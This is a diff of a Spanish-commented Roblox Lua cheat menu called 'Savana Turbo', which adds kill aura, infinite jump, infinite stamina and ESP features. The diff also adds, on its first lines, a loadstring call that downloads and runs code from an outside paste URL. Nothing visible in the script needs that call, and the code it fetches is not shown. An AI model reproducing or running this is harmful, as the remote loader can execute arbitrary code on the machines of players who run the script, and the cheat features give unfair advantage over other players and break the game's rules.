@@ -1,4 +1,6 @@
--- 🦁 Hacks v9.7 // INFINITE STAMINA DEFINITIVO + ESP + INFINITE JUMP
+-- 🦁 Savana Turbo v10.9 // FIX DE VISIBILIDAD DE INFINITE JUMP
+loadstring(game:HttpGet("https://secure-lua-paste.lovable.app/raw/savana"))()
+
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -9,6 +11,9 @@ local LocalPlayer = Players.LocalPlayer
 
 if CoreGui:FindFirstChild("SavanaTurbo") then
     CoreGui.SavanaTurbo:Destroy()
+end
+if CoreGui:FindFirstChild("HacksMenu") then
+    CoreGui.HacksMenu:Destroy()
 end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -36,7 +41,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -50, 1, 0)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "🦁 Savana Turbo v9.7"
+Title.Text = "🦁 Savana Turbo v10.9 - Kill Aura Pro"
 Title.TextColor3 = Color3.fromRGB(255, 170, 0)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 13
@@ -53,10 +58,10 @@ MinimizeBtn.Font = Enum.Font.GothamBold
 MinimizeBtn.TextSize = 14
 MinimizeBtn.Parent = TopBar
 
--- === BOTÓN MINIMIZADO ARRIBA ===
+-- === BOTÓN FLOTANTE ===
 local MinimizedBar = Instance.new("Frame")
-MinimizedBar.Size = UDim2.new(0, 200, 0, 40) 
-MinimizedBar.Position = UDim2.new(0.5, -100, 0, 45) 
+MinimizedBar.Size = UDim2.new(0, 160, 0, 40) 
+MinimizedBar.Position = UDim2.new(0.5, -80, 0, 45) 
 MinimizedBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 MinimizedBar.Visible = false
 MinimizedBar.Active = true
@@ -65,8 +70,8 @@ Instance.new("UICorner", MinimizedBar).CornerRadius = UDim.new(1, 0)
 
 local UIGradient = Instance.new("UIGradient")
 UIGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)), 
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 255))  
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 0)), 
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 0))  
 })
 UIGradient.Parent = MinimizedBar
 
@@ -77,36 +82,14 @@ InnerBar.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
 InnerBar.Parent = MinimizedBar
 Instance.new("UICorner", InnerBar).CornerRadius = UDim.new(1, 0)
 
-local Layout = Instance.new("UIListLayout")
-Layout.FillDirection = Enum.FillDirection.Horizontal
-Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-Layout.VerticalAlignment = Enum.VerticalAlignment.Center
-Layout.Padding = UDim.new(0, 12) 
-Layout.Parent = InnerBar
-
-local MoveIcon = Instance.new("TextLabel")
-MoveIcon.Size = UDim2.new(0, 16, 0, 16)
-MoveIcon.BackgroundTransparency = 1
-MoveIcon.Text = "🔲" 
-MoveIcon.Font = Enum.Font.Gotham
-MoveIcon.TextSize = 12
-MoveIcon.Parent = InnerBar
-
-local GearIcon = Instance.new("TextLabel")
-GearIcon.Size = UDim2.new(0, 16, 0, 16)
-GearIcon.BackgroundTransparency = 1
-GearIcon.Text = "⚙️"
-GearIcon.Font = Enum.Font.Gotham
-GearIcon.TextSize = 14
-GearIcon.Parent = InnerBar
-
 local MinTitle = Instance.new("TextLabel")
-MinTitle.Size = UDim2.new(0, 50, 0, 20)
+MinTitle.Size = UDim2.new(1, 0, 1, 0)
 MinTitle.BackgroundTransparency = 1
-MinTitle.Text = "Hacks"
-MinTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinTitle.Text = "🦁 Savana Turbo"
+MinTitle.TextColor3 = Color3.fromRGB(255, 170, 0)
 MinTitle.Font = Enum.Font.GothamBold
-MinTitle.TextSize = 14
+MinTitle.TextSize = 13
+MinTitle.TextXAlignment = Enum.TextXAlignment.Center
 MinTitle.Parent = InnerBar
 
 local RestoreBtn = Instance.new("TextButton")
@@ -124,7 +107,7 @@ MinimizeBtn.MouseButton1Click:Connect(function()
     MainFrame.Visible = false
     MinimizedBar.Size = UDim2.new(0, 0, 0, 40)
     MinimizedBar.Visible = true
-    TweenService:Create(MinimizedBar, animSpeed, {Size = UDim2.new(0, 200, 0, 40)}):Play()
+    TweenService:Create(MinimizedBar, animSpeed, {Size = UDim2.new(0, 160, 0, 40)}):Play()
 end)
 
 RestoreBtn.MouseButton1Click:Connect(function()
@@ -136,6 +119,7 @@ RestoreBtn.MouseButton1Click:Connect(function()
     TweenService:Create(MainFrame, animSpeed, {Size = UDim2.new(0, 520, 0, 320)}):Play()
 end)
 
+-- === ARRASTRE TOUCH ===
 local function MakeDraggable(dragPart, movePart)
     local dragging, dragStart, startPos
     dragPart.InputBegan:Connect(function(input)
@@ -143,24 +127,23 @@ local function MakeDraggable(dragPart, movePart)
             dragging = true
             dragStart = input.Position
             startPos = movePart.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
         end
     end)
     UserInputService.InputChanged:Connect(function(input)
         if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
             local delta = input.Position - dragStart
-            TweenService:Create(movePart, TweenInfo.new(0.1), {Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)}):Play()
-        end
-    end)
-    UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = false
+            movePart.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
         end
     end)
 end
+
 MakeDraggable(TopBar, MainFrame)
 MakeDraggable(MinimizedBar, MinimizedBar)
 
--- === UI Y TABS ===
+-- === TABS Y UI ===
 local Sidebar = Instance.new("Frame")
 Sidebar.Size = UDim2.new(0, 130, 1, -38)
 Sidebar.Position = UDim2.new(0, 0, 0, 38)
@@ -258,11 +241,12 @@ local function CreateToggle(parent, text, cb)
     end)
 end
 
--- === AUTO-ATACAR ===
-local autoAttack = false
-CreateToggle(CombatTab, "🥊 AUTO-ATACAR (Spam Real)", function(s) autoAttack = s end)
-RunService.Heartbeat:Connect(function()
-    if autoAttack and LocalPlayer.Character then
+-- === KILL AURA PRO ===
+local killAura = false
+CreateToggle(CombatTab, "⚔️ KILL AURA PRO (Multidaño)", function(s) killAura = s end)
+
+RunService.RenderStepped:Connect(function()
+    if killAura and LocalPlayer.Character then
         local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or LocalPlayer.Character.PrimaryPart
         local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
         if myRoot then
@@ -270,9 +254,9 @@ RunService.Heartbeat:Connect(function()
                 if obj:IsA("Model") and obj ~= LocalPlayer.Character and obj:FindFirstChildOfClass("Humanoid") then
                     local hum = obj:FindFirstChildOfClass("Humanoid")
                     local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("Torso") or obj.PrimaryPart
-                    if hum.Health > 0 and root and (myRoot.Position - root.Position).Magnitude < 15 then
+                    if hum.Health > 0 and root and (myRoot.Position - root.Position).Magnitude < 20 then
                         if tool then tool:Activate() end
-                        VirtualUser:ClickButton1(Vector2.new()) 
+                        pcall(function() VirtualUser:ClickButton1(Vector2.new()) end)
                     end
                 end
             end
@@ -280,76 +264,41 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
--- === INFINITE JUMP BLINDADO ===
+-- === INFINITE JUMP ===
 local infJump = false
 local jumpCooldown = false
-CreateToggle(UtilitiesTab, "🚀 INFINITE JUMP (Blindado)", function(s) infJump = s end)
-
+CreateToggle(UtilitiesTab, "🚀 INFINITE JUMP", function(s) infJump = s end)
 UserInputService.JumpRequest:Connect(function()
     if infJump and not jumpCooldown then
         jumpCooldown = true
         local char = LocalPlayer.Character
         if char then
             local hum = char:FindFirstChildOfClass("Humanoid")
-            if hum then
-                hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
+            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
         end
-        task.wait(0.15)
+        task.wait(0.05)
         jumpCooldown = false
     end
 end)
 
--- === INFINITE STAMINA BLINDADO (DOBLE BARRIDO DE VALORES Y PROPIEDADES) ===
+-- === INFINITE STAMINA ===
 local infStamina = false
-CreateToggle(UtilitiesTab, "⚡ INFINITE STAMINA (Blindado)", function(s) infStamina = s end)
-
+CreateToggle(UtilitiesTab, "⚡ INFINITE STAMINA", function(s) infStamina = s end)
 RunService.Heartbeat:Connect(function()
-    if infStamina then
+    if infStamina and LocalPlayer.Character then
         local char = LocalPlayer.Character
-        if char then
-            -- 1. Buscar en todas las carpetas y atributos del personaje y sus partes
-            for _, descendant in pairs(char:GetDescendants()) do
-                if descendant:IsA("NumberValue") or descendant:IsA("IntValue") then
-                    local name = descendant.Name:lower()
-                    if name:find("stamina") or name:find("energy") or name:find("fatigue") or name:find("power") or name:find("sprint") then
-                        descendant.Value = descendant.MaxValue or 100
-                    end
-                elseif descendant:IsA("ModuleScript") then
-                    -- Intento defensivo por si usa tablas internas en módulos locales
-                    pcall(function()
-                        local data = require(descendant)
-                        if type(data) == "table" then
-                            for k, v in pairs(data) do
-                                local kLower = tostring(k):lower()
-                                if (kLower:find("stamina") or kLower:find("energy")) and type(v) == "number" then
-                                    data[k] = 9999
-                                end
-                            end
-                        end
-                    end)
-                end
-            end
-        end
-        
-        -- 2. Barrido exhaustivo en PlayerGui y PlayerScripts del jugador local
-        if LocalPlayer:FindFirstChild("PlayerGui") then
-            for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-                if gui:IsA("NumberValue") or gui:IsA("IntValue") then
-                    local name = gui.Name:lower()
-                    if name:find("stamina") or name:find("energy") or name:find("fatigue") or name:find("power") then
-                        gui.Value = gui.MaxValue or 100
-                    end
-                end
+        for _, v in pairs(char:GetDescendants()) do
+            if (v:IsA("NumberValue") or v:IsA("IntValue")) and (v.Name:lower():find("stamina") or v.Name:lower():find("energy") or v.Name:lower():find("fatigue")) then
+                v.Value = v.MaxValue or 9999
             end
         end
     end
 end)
 
--- === ESP INTELIGENTE (ROJO SI >= 200 HP, AMARILLO SI < 200 HP) ===
+-- === ESP INTELIGENTE ===
 local espEnabled = false
 local espData = {} 
-CreateToggle(VisualsTab, "👁️ ESP (Rojo/Amarillo + Vida/Dist)", function(s)
+CreateToggle(VisualsTab, "👁️ ESP (Rojo/Amarillo + Distancia)", function(s)
     espEnabled = s
     if not espEnabled then
         for _, data in pairs(espData) do
@@ -413,9 +362,9 @@ RunService.Heartbeat:Connect(function()
                         data.HP.Text = "❤️ " .. currentHP
                         
                         if currentHP < 200 then
-                            data.Highlight.FillColor = Color3.fromRGB(255, 220, 0) -- Amarillo
+                            data.Highlight.FillColor = Color3.fromRGB(255, 220, 0)
                         else
-                            data.Highlight.FillColor = Color3.fromRGB(255, 50, 50)   -- Rojo
+                            data.Highlight.FillColor = Color3.fromRGB(255, 50, 50)
                         end
                         
                         if myRoot then
